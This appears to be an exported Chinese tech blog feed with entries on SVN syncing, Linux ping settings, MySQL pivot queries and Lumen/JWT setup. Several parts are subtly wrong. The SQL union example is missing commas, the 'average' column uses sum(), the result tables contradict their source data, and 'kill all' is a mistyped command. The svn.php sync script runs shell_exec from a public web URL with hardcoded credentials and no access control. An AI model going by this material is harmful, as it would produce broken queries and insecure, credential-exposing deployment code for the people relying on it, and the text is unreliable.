<p>svn服务的关闭：</p>
<p><code>kill all svnserve</code></p>
<p>svn开启：</p>
<p><code>svnserve -d -r /var/www/svndata</code></p>
<p>SVN自动同步程序执行流程：</p>
<blockquote>
<p>1、用户提交文件到SVN服务器，提交操作成功后触发post-commit脚本</p>
<p>2、在post-commit版本文件中使用php_script.php执行PHP脚本</p>
<p>3、在PHP脚本中通过exec系统调用更新服务器上的版本库工作副本</p>
<p>4、根据更新操作结果日志，对另一个SVN版本库进行对应的操作处理</p>
</blockquote>
<p>当然，你也可以手动同步到web：(以php为例)</p>
<ul>
<li>创建 svn.php 到你的项目根目录（可以是php-fpm能解析的目录也可，只是需要更改下面对应的项目地址）,文件内容如下：</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$project = <span class="keyword">__DIR__</span>; <span class="comment">// 项目地址</span></span><br><span class="line"></span><br><span class="line">$str = <span class="string">"svn update &#123;$project&#125; --username 用户名 --password 密码 --no-auth-cache 2&gt;&amp;1"</span>;</span><br><span class="line"></span><br><span class="line">$res = @shell_exec($str);</span><br><span class="line"></span><br><span class="line">var_dump($res);</span><br></pre></td></tr></table></figure>

<p>注意：需要将项目所属组改到 web服务器用户：<code>chown -R nginx:nginx 项目/</code> , 否则会出现权限不够的情况</p>
<ul>
<li>通过web访问 项目地址/svn.php 即可同步你的代码到web上面。</li>
</ul>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
      <tags>
        <tag>svn安装</tag>
        <tag>svn配置</tag>
        <tag>svn同步</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux禁止ping以及开启ping的方法</title>
    <url>/articles/Linux%E7%A6%81%E6%AD%A2ping%E4%BB%A5%E5%8F%8A%E5%BC%80%E5%90%AFping%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Linux默认是允许Ping响应的，系统是否允许Ping由内核参数、防火墙2个因素决定的，需要2个因素同时允许才能允许Ping，2个因素有任意一个禁Ping就无法Ping。</p>
<p>具体的配置方法如下：</p>
<h3 id="一、内核参数设置"><a href="#一、内核参数设置" class="headerlink" title="一、内核参数设置"></a>一、内核参数设置</h3><p><code>icmp_echo_ignore_all : 0表示允许，1表示禁止</code></p>
<p><img src="/articles/Linux禁止ping以及开启ping的方法/icmp.png" alt="e攻城狮"> </p>
<ul>
<li>临时允许PING操作的命令</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">echo</span> 0 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all</span><br></pre></td></tr></table></figure>

<ul>
<li>永久允许PING配置方法。</li>
</ul>
<p>/etc/sysctl.conf 中增加一行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net.ipv4.icmp_echo_ignore_all=0</span><br></pre></td></tr></table></figure>

<p>如果已经有net.ipv4.icmp_echo_ignore_all这一行了，直接修改值即可。</p>
<p>禁止Ping的方法类似，只需要设置<code>icmp_echo_ignore_all=1</code>即可</p>
<p>修改完成后执行<code>sysctl -p</code>使新配置生效。</p>
<h3 id="二、防火墙设置"><a href="#二、防火墙设置" class="headerlink" title="二、防火墙设置"></a>二、防火墙设置</h3><p>（注：此处的方法的前提是内核配置是默认值，也就是没有禁止Ping）</p>
<p>这里以iptables防火墙为例，其他防火墙操作方法可参考防火墙的官方文档。</p>
<ul>
<li>允许PING设置      </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>或者也可以临时停止防火墙操作的。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">service iptables stop</span><br></pre></td></tr></table></figure>

<ul>
<li>禁止PING设置</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>MYSQL中竖表和横表之间的相互转换</title>
    <url>/articles/MYSQL%E4%B8%AD%E7%AB%96%E8%A1%A8%E5%92%8C%E6%A8%AA%E8%A1%A8%E4%B9%8B%E9%97%B4%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<h4 id="横表转为竖表"><a href="#横表转为竖表" class="headerlink" title="横表转为竖表"></a>横表转为竖表</h4><p>表tb的结构为</p>
<table>
<thead>
<tr>
<th align="left">字段名</th>
<th align="left">类型</th>
<th align="left">允许为空</th>
<th align="left">是否主键</th>
</tr>
</thead>
<tbody><tr>
<td align="left">id</td>
<td align="left">int(11)</td>
<td align="left">no</td>
<td align="left">yes</td>
</tr>
<tr>
<td align="left">姓名</td>
<td align="left">int(11)</td>
<td align="left">yes</td>
<td align="left">no</td>
</tr>
<tr>
<td align="left">语文</td>
<td align="left">decimal(3,1)</td>
<td align="left">yes</td>
<td align="left">no</td>
</tr>
<tr>
<td align="left">数学</td>
<td align="left">decimal(3,1)</td>
<td align="left">yes</td>
<td align="left">no</td>
</tr>
<tr>
<td align="left">英语</td>
<td align="left">decimal(3,1)</td>
<td align="left">yes</td>
<td align="left">no</td>
</tr>
</tbody></table>
<p>表中的数据为</p>
<table>
<thead>
<tr>
<th align="left">id</th>
<th align="left">姓名</th>
<th align="left">语文</th>
<th align="left">数学</th>
<th align="left">英语</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">小张</td>
<td align="left">89</td>
<td align="left">80</td>
<td align="left">89</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">小丽</td>
<td align="left">69</td>
<td align="left">78</td>
<td align="left">98</td>
</tr>
</tbody></table>
<p>现在要求查询到如下结果</p>
<table>
<thead>
<tr>
<th align="left">name</th>
<th align="left">subject</th>
<th align="left">score</th>
</tr>
</thead>
<tbody><tr>
<td align="left">小丽</td>
<td align="left">语文</td>
<td align="left">69</td>
</tr>
<tr>
<td align="left">小丽</td>
<td align="left">数学</td>
<td align="left">78</td>
</tr>
<tr>
<td align="left">小丽</td>
<td align="left">英语</td>
<td align="left">79</td>
</tr>
<tr>
<td align="left">小张</td>
<td align="left">语文</td>
<td align="left">89</td>
</tr>
<tr>
<td align="left">小张</td>
<td align="left">数学</td>
<td align="left">80</td>
</tr>
<tr>
<td align="left">小张</td>
<td align="left">英语</td>
<td align="left">89</td>
</tr>
</tbody></table>
<p>使用的SQL查询语句应该如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">select</span> 姓名 <span class="keyword">as</span> <span class="keyword">name</span>, <span class="string">'语文'</span> <span class="keyword">as</span> subject, 语文 <span class="keyword">as</span> score <span class="keyword">from</span> tb</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> 姓名 <span class="keyword">as</span> <span class="keyword">name</span>, <span class="string">'数学'</span> <span class="keyword">as</span> subject, 数学 <span class="keyword">as</span> score <span class="keyword">from</span> tb</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> 姓名 <span class="keyword">as</span> <span class="keyword">name</span>, <span class="string">'英语'</span> <span class="keyword">as</span> subject, 英语 <span class="keyword">as</span> score <span class="keyword">from</span> tb</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">name</span></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span>(</span><br><span class="line">    <span class="keyword">select</span> 姓名 <span class="keyword">as</span> <span class="keyword">name</span>, <span class="string">'语文'</span> <span class="keyword">as</span> subject <span class="string">`语文`</span> <span class="keyword">as</span> score <span class="keyword">from</span> tb</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    <span class="keyword">select</span> 姓名 <span class="keyword">as</span> <span class="keyword">name</span>, <span class="string">'数学'</span> <span class="keyword">as</span> subject <span class="string">`数学`</span> <span class="keyword">as</span> score <span class="keyword">from</span> tb</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    <span class="keyword">select</span> 姓名 <span class="keyword">as</span> <span class="keyword">name</span>, <span class="string">'英语'</span> <span class="keyword">as</span> subject <span class="string">`英语`</span> <span class="keyword">as</span> score <span class="keyword">from</span> tb</span><br><span class="line">) <span class="keyword">as</span> tb2</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">name</span></span><br></pre></td></tr></table></figure>

<h4 id="竖表转为横表"><a href="#竖表转为横表" class="headerlink" title="竖表转为横表"></a>竖表转为横表</h4><p>tb2表的结构如下</p>
<table>
<thead>
<tr>
<th align="left">字段名</th>
<th align="left">类型</th>
<th align="left">允许为空</th>
<th align="left">是否主键</th>
</tr>
</thead>
<tbody><tr>
<td align="left">id</td>
<td align="left">int(11)</td>
<td align="left">no</td>
<td align="left">yes</td>
</tr>
<tr>
<td align="left">name</td>
<td align="left">varchar(255)</td>
<td align="left">yes</td>
<td align="left">no</td>
</tr>
<tr>
<td align="left">subject</td>
<td align="left">varchar(255)</td>
<td align="left">yes</td>
<td align="left">no</td>
</tr>
<tr>
<td align="left">score</td>
<td align="left">decimal(3,1)</td>
<td align="left">yes</td>
<td align="left">no</td>
</tr>
</tbody></table>
<p>tb2的数据如下</p>
<table>
<thead>
<tr>
<th align="left">id</th>
<th align="left">name</th>
<th align="left">subject</th>
<th align="left">score</th>
</tr>
</thead>
<tbody><tr>
<td align="left">2</td>
<td align="left">小丽</td>
<td align="left">英语</td>
<td align="left">98</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">小丽</td>
<td align="left">数学</td>
<td align="left">78</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">小张</td>
<td align="left">语文</td>
<td align="left">89</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">小张</td>
<td align="left">数学</td>
<td align="left">80</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">小张</td>
<td align="left">英语</td>
<td align="left">89</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">小丽</td>
<td align="left">语文</td>
<td align="left">69</td>
</tr>
</tbody></table>
<p>现在想把tb2的数据变为</p>
<table>
<thead>
<tr>
<th align="left">姓名</th>
<th align="left">语文</th>
<th align="left">英语</th>
<th align="left">数学</th>
</tr>
</thead>
<tbody><tr>
<td align="left">小丽</td>
<td align="left">68</td>
<td align="left">98</td>
<td align="left">78</td>
</tr>
<tr>
<td align="left">小张</td>
<td align="left">89</td>
<td align="left">89</td>
<td align="left">80</td>
</tr>
</tbody></table>
<p>查询的SQL语句如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">as</span> <span class="string">'姓名'</span>,</span><br><span class="line">    <span class="keyword">max</span>(<span class="keyword">case</span> subject <span class="keyword">when</span> <span class="string">'语文'</span> <span class="keyword">then</span> score <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) 语文,</span><br><span class="line">    <span class="keyword">max</span>(<span class="keyword">case</span> subject <span class="keyword">when</span> <span class="string">'英语'</span> <span class="keyword">then</span> score <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) 英语,</span><br><span class="line">    <span class="keyword">max</span>(<span class="keyword">case</span> subject <span class="keyword">when</span> <span class="string">'数学'</span> <span class="keyword">then</span> score <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) 数学</span><br><span class="line"><span class="keyword">from</span> tb2</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">name</span></span><br></pre></td></tr></table></figure>

<p>现在要求得到如下查询结果</p>
<table>
<thead>
<tr>
<th align="left">姓名</th>
<th align="left">语文</th>
<th align="left">数学</th>
<th align="left">英语</th>
<th align="left">总分</th>
<th align="left">平均分</th>
</tr>
</thead>
<tbody><tr>
<td align="left">小丽</td>
<td align="left">69</td>
<td align="left">78</td>
<td align="left">98</td>
<td align="left">245</td>
<td align="left">81.6666667</td>
</tr>
<tr>
<td align="left">小张</td>
<td align="left">89</td>
<td align="left">80</td>
<td align="left">89</td>
<td align="left">258</td>
<td align="left">86</td>
</tr>
</tbody></table>
<p>SQL查询语句应该为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`name`</span> <span class="keyword">as</span> 姓名,</span><br><span class="line"><span class="keyword">max</span>(<span class="keyword">case</span> <span class="string">`subject`</span> <span class="keyword">when</span> <span class="string">'语文'</span> <span class="keyword">then</span> <span class="string">`score`</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) <span class="keyword">as</span> 语文,</span><br><span class="line"><span class="keyword">max</span>(<span class="keyword">case</span> <span class="string">`subject`</span> <span class="keyword">when</span> <span class="string">'数学'</span> <span class="keyword">then</span> <span class="string">`score`</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) <span class="keyword">as</span> 数学,</span><br><span class="line"><span class="keyword">max</span>(<span class="keyword">case</span> <span class="string">`subject`</span> <span class="keyword">when</span> <span class="string">'英语'</span> <span class="keyword">then</span> <span class="string">`score`</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) <span class="keyword">as</span> 英语,</span><br><span class="line"><span class="keyword">sum</span>(<span class="string">`score`</span>) <span class="keyword">as</span> 总分,</span><br><span class="line"><span class="keyword">sum</span>(<span class="string">`score`</span>) <span class="keyword">as</span> 平均分</span><br><span class="line"><span class="keyword">from</span> <span class="string">`tb2`</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="string">`name`</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>Lumen项目整合</title>
    <url>/articles/Lumen%E9%A1%B9%E7%9B%AE%E6%95%B4%E5%90%88/</url>
    <content><![CDATA[<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><h3 id="通过-Lumen-安装器"><a href="#通过-Lumen-安装器" class="headerlink" title="通过 Lumen 安装器"></a>通过 Lumen 安装器</h3><p>首先，使用 Composer 下载 Lumen 安装包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer global require &quot;laravel/lumen-installer&quot;</span><br></pre></td></tr></table></figure>

<p>请确保你已将 ~/.composer/vendor/bin 路径添加到环境变量 PATH 中，只有这样系统才能找到 lumen 的可执行文件。<a href="/articles/Composer安装/">如何让安装Composer?</a></p>
<p>一旦安装完成，使用 lumen new 将会在您指定的目录中创建一个新的Lumen 项目。例如： lumen new blog 命令将会创建一个名字叫 blog 的目录 ，此目录里面存放着新安装的 Lumen 和代码依赖。这个方法的安装速度比通过 Composer 安装要快很多：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lumen new blog</span><br></pre></td></tr></table></figure>

<p>此方法的缺点也很明显，无法安装指定的lumen版本.需要安装指定版本的Lumen可参考下面的方法.</p>
<h3 id="通过-Composer-Create-Project-命令安装"><a href="#通过-Composer-Create-Project-命令安装" class="headerlink" title="通过 Composer Create-Project 命令安装"></a>通过 Composer Create-Project 命令安装</h3><p>你也可以在你电脑的终端输入 create-project 命令来安装 Lumen ：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer create-project  laravel/lumen blog  --prefer-dist &quot;5.2.*&quot;</span><br></pre></td></tr></table></figure>

<h2 id="二、项目目录"><a href="#二、项目目录" class="headerlink" title="二、项目目录"></a>二、项目目录</h2><p>在lumen 基础上添加了   <code>Models</code>  目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/</span><br><span class="line">|-- app                             项目应用目录</span><br><span class="line">|   |-- Console                     自定义的 Artisan 命令</span><br><span class="line">|   |-- |-- Kernel.php              注册自定义的 Artisan 命令以及定义调度任务</span><br><span class="line">|   |-- Events                      存放事件类</span><br><span class="line">|   |-- Extends                     存放自定义扩展，例如Excel导出等</span><br><span class="line">|   |-- Exceptions                  异常处理</span><br><span class="line">|   |   |-- Handler.php             处理应用抛出的异常</span><br><span class="line">|   |-- helpers.php                 自定义函数方法</span><br><span class="line">|   |-- Http                        主程序</span><br><span class="line">|   |   |-- Middleware              中间件</span><br><span class="line">|   |   |-- Controllers             控制器</span><br><span class="line">|   |   |   |-- Admin               后台目录</span><br><span class="line">|   |   |       |-- V1              V1版本</span><br><span class="line">|   |   |           |-- Logic       业务逻辑</span><br><span class="line">|   |   |   |-- Api                 前台目录</span><br><span class="line">|   |   |       |-- V1              V1版本</span><br><span class="line">|   |   |           |-- Logic       业务逻辑</span><br><span class="line">|   |   |   |-- Pub                 公共目录</span><br><span class="line">|   |   |       |-- V1              V1版本</span><br><span class="line">|   |               |-- Logic       业务逻辑</span><br><span class="line">|   |   |-- Controller.php          版本父级控制层</span><br><span class="line">|   |   |-- Logic.php               版本父级逻辑层</span><br><span class="line">|   |-- Jobs                        队列任务</span><br><span class="line">|   |-- Listeners                   事件监听器</span><br><span class="line">|   |-- Providers                   服务提供</span><br><span class="line">|   |-- Models                      数据模型目录 </span><br><span class="line">|-- bootstrap                       自动加载配置 </span><br><span class="line">|   |-- app.php                     启动、自动加载配置</span><br><span class="line">|-- config                          所有应用配置文件</span><br><span class="line">|   |-- auth.php                    auth授权配置</span><br><span class="line">|   |-- cors.php                    cors跨域配置</span><br><span class="line">|   |-- database.php                database配置</span><br><span class="line">|-- database                        数据迁移、填充文件</span><br><span class="line">|-- public                          Web站点根目录</span><br><span class="line">|-- resources                       视图、原生资源文件</span><br><span class="line">|   |-- lang                        语言目录</span><br><span class="line">|-- routes                          路由配置文件</span><br><span class="line">|   |-- admin                       后台管理路由配置</span><br><span class="line">|   	|-- admin.php             </span><br><span class="line">|   |-- api                         前台路由配置</span><br><span class="line">|   	|-- api.php               </span><br><span class="line">|   |-- pub                         公共路由配置</span><br><span class="line">|   	|-- pub.php                     </span><br><span class="line">|-- storage                         缓存、框架生成文件</span><br><span class="line">|   |-- app                         存放应用生成的文件</span><br><span class="line">|   |-- framework                   框架生成的文件或缓存</span><br><span class="line">|   |-- logs                        日志文件</span><br><span class="line">|-- tests                           自动化测试</span><br><span class="line">|-- vendor                          Composer依赖文件</span><br><span class="line">|-- .env                            配置文件</span><br><span class="line">|-- .env.example                    配置文件备份 </span><br><span class="line">|-- composer.json</span><br><span class="line">\</span><br></pre></td></tr></table></figure>

<h2 id="三、-数据模型"><a href="#三、-数据模型" class="headerlink" title="三、 数据模型"></a>三、 数据模型</h2><h3 id="3-1-命名规范"><a href="#3-1-命名规范" class="headerlink" title="3.1 命名规范"></a>3.1 命名规范</h3><p>数据模型相关的命名规范：</p>
<ul>
<li>数据模型类名 必须 为「单数」, 如：App\Models\Photo</li>
<li>类文件名 必须 为「单数」，如：app/Models/Photo.php</li>
<li>数据库表名字 必须 为「复数」，多个单词情况下使用「Snake Case」 如：photos, my_photos</li>
<li>数据库表迁移名字 必须 为「复数」，如：2014_08_08_234417_create_photos_table.php</li>
<li>数据填充文件名 必须 为「复数」，如：PhotosTableSeeder.php</li>
<li>数据库字段名 必须 为「Snake Case」，如：view_count, is_vip</li>
<li>数据库表主键 必须 为「id」</li>
<li>数据库表外键 必须 为「resource_id」，如：user_id, post_id</li>
<li>数据模型变量 必须 为「resource_id」，如：$user_id, $post_id</li>
</ul>
<h3 id="3-1-Mysql模型"><a href="#3-1-Mysql模型" class="headerlink" title="3.1 Mysql模型"></a>3.1 Mysql模型</h3><p>在app目录下创建数据模型 <code>Models</code></p>
<p>在数据模型开头修改命名空间</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在app根目录的数据模型 命名空间为：</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改为命名空间为</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用 Models下的User模型</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">User</span>;</span><br></pre></td></tr></table></figure>

<p>其他目录的添加同上，只是在命名空间上做修改。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Extend</span>\<span class="title">TraitDbEloquent</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseModel</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">TraitDbEloquent</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// default db</span></span><br><span class="line">    <span class="keyword">protected</span> $connection = <span class="string">'mysql'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">parent</span>::__construct();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-Mongo模型"><a href="#3-2-Mongo模型" class="headerlink" title="3.2 Mongo模型"></a>3.2 Mongo模型</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Mongo</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Extend</span>\<span class="title">TraitDbEloquent</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Jenssegers</span>\<span class="title">Mongodb</span>\<span class="title">Eloquent</span>\<span class="title">Model</span> <span class="title">as</span> <span class="title">Eloquent</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseModel</span> <span class="keyword">extends</span> <span class="title">Eloquent</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">TraitDbEloquent</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// primary key</span></span><br><span class="line">    <span class="keyword">protected</span> $primaryKey = <span class="string">"_id"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// primary key type</span></span><br><span class="line">    <span class="keyword">protected</span> $keyType = <span class="string">"string"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// default db</span></span><br><span class="line">    <span class="keyword">protected</span> $connection = <span class="string">'mongodb'</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <code>TraitDbEloquent</code> 封装了数据库CURD操作。</p>
<h2 id="四、统一输出"><a href="#四、统一输出" class="headerlink" title="四、统一输出"></a>四、统一输出</h2><p>在helpers.php中统一处理输出模块，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 统一输出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int $code</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $msg</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $data</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">format_return</span><span class="params">($code, $msg = null, $data = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $res = [</span><br><span class="line">        <span class="string">'code'</span> =&gt; $code,</span><br><span class="line">        <span class="string">'msg'</span> =&gt; is_null($msg) ? trans(<span class="string">"reponse.$code"</span>) : $msg</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">if</span> (!is_null($data)) &#123;</span><br><span class="line">        $res[<span class="string">'data'</span>] = $data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中trans定义了状态信息，放在 <code>./resources/lang/</code>文件，方便支持多语言</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// zh-CN/reponse.php 中文简体</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="number">2000</span> =&gt; <span class="string">'请求成功'</span>,</span><br><span class="line">    <span class="number">4000</span> =&gt; <span class="string">'请求失败'</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">//en/reponse.php 英文</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="number">2000</span> =&gt; <span class="string">'ok'</span>,</span><br><span class="line">    <span class="number">4000</span> =&gt; <span class="string">'fail'</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<h2 id="五、-JWT配置"><a href="#五、-JWT配置" class="headerlink" title="五、 JWT配置"></a>五、 JWT配置</h2><h3 id="5-1-安装"><a href="#5-1-安装" class="headerlink" title="5.1 安装"></a>5.1 安装</h3><p>通过composer安装jwt-auth</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer require tymon/jwt-auth &quot;1.*&quot;</span><br></pre></td></tr></table></figure>

<p>注意：jwt-auth 0.5.* 版本未对lumen做封装</p>
<h3 id="5-2-修改自动加载配置-文件-bootstrap-app-php"><a href="#5-2-修改自动加载配置-文件-bootstrap-app-php" class="headerlink" title="5.2 修改自动加载配置 文件   bootstrap/app.php"></a>5.2 修改自动加载配置 文件   <code>bootstrap/app.php</code></h3><ul>
<li>去掉  <code>$app-&gt;withFacades()</code>  <code>$app-&gt;withEloquent()</code> 的注释</li>
<li>添加 jwt 接口</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//使用 Facades 静态类</span></span><br><span class="line">$app-&gt;withFacades(<span class="keyword">true</span>,[</span><br><span class="line">    <span class="string">'Tymon\JWTAuth\Facades\JWTAuth'</span> =&gt; <span class="string">'JWTAuth'</span>,</span><br><span class="line">    <span class="string">'Tymon\JWTAuth\Facades\JWTFactory'</span> =&gt; <span class="string">'JWTFactory'</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$app-&gt;withEloquent();  <span class="comment">//使用 Eloquent ORM</span></span><br></pre></td></tr></table></figure>

<ul>
<li>去掉 auth 中间件 注释</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//auth 中间件</span></span><br><span class="line"> $app-&gt;routeMiddleware([</span><br><span class="line">     <span class="string">'auth'</span> =&gt; App\Http\Middleware\Authenticate::class,</span><br><span class="line"> ]);</span><br></pre></td></tr></table></figure>

<ul>
<li>去掉appServiceProvider的注释，并且在 AppServiceProvider 中注册 LumenServiceProvider</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$app-&gt;register(App\Providers\AppServiceProvider::class);</span><br><span class="line">$app-&gt;register(App\Providers\AuthServiceProvider::class); </span><br><span class="line">$app-&gt;register(\Tymon\JWTAuth\Providers\LumenServiceProvider::class);</span><br></pre></td></tr></table></figure>

<h3 id="5-3-jwt配置"><a href="#5-3-jwt配置" class="headerlink" title="5.3 jwt配置"></a>5.3 jwt配置</h3><ul>
<li>获取 auth 配置文件<br>在 lumen 根目录下 创建 config 文件夹 （laravel 框架 自动加载 config 文件夹的内容），并将 vendor/laravel/lumen-framework/config 中的 auth.php 文件复制到刚刚创建的config文件夹中。修改 auth.php 文件，将 api 认证指定为 jwt，并绑定users 数据模型</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//原</span></span><br><span class="line">    <span class="string">'guards'</span> =&gt; [</span><br><span class="line">        <span class="string">'api'</span> =&gt; [<span class="string">'driver'</span> =&gt; <span class="string">'api'</span>],</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改为：</span></span><br><span class="line">    <span class="string">'guards'</span> =&gt; [</span><br><span class="line">        <span class="string">'api'</span> =&gt; [<span class="string">'driver'</span> =&gt; <span class="string">'jwt'</span>],</span><br><span class="line">        <span class="string">'provider'</span> =&gt; <span class="string">'users'</span></span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//指定数据模型</span></span><br><span class="line"> <span class="string">'providers'</span> =&gt; [ </span><br><span class="line">        <span class="string">'users'</span> =&gt; [</span><br><span class="line">            <span class="string">'driver'</span> =&gt; <span class="string">'eloquent'</span>,</span><br><span class="line">            <span class="string">'model'</span>  =&gt; \App\Models\User::class,</span><br><span class="line">        ],</span><br><span class="line">    ],</span><br></pre></td></tr></table></figure>

<ul>
<li>JWT 协议需要用到 secret，所以需要生成一个 secret，在根目录下 执行命令</li>
</ul>
